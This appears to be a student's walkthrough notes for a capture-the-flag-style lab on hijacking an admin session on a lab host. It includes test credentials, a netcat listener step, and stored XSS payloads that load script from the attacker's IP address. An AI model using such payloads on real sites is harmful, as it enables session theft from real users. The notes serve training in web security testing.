You are currently participating in a bug bounty program.

- The only URL in scope is `http://minilab.htb.net`
- Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
- Test account credentials:
    - Email: heavycat106
    - Password: rocknroll
- Through dirbusting, you identified the following endpoint `http://minilab.htb.net/submit-solution`

Find a way to hijack an admin's session. Once you do that, answer the two questions below.

![[Pasted image 20231219082217.png]]

![[Pasted image 20231219082236.png]]

![[Pasted image 20231219082259.png]]

Start an NC Listener

![[Pasted image 20231219083650.png]]

```
<script src=http://10.10.14.3:9001/TelephoneField></script>
<script src=http://10.10.14.3:9001/CountryField></script>
```

![[Pasted image 20231219083254.png]]

Test both fields with the payload and then click share

![[Pasted image 20231219083621.png]]

![[Pasted image 20231219083631.png]]

Generate payloads

```
<script src=http://10.10.14.3:9001/script.js></script>
```

![[Pasted image 20231219085110.png]]

Subsequently, using Julie's share link, `http://minilab.htb.net/profile?email=julie.rogers@example.com`, students need to navigate to `http://minilab.htb.net/submit-solution` and provide the share link as the value for the URL parameter `url`, as in `http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`

![[Pasted image 20231219085314.png]]

![[Pasted image 20231219085710.png]]

![[Pasted image 20231219085723.png]]

and change the profile to make public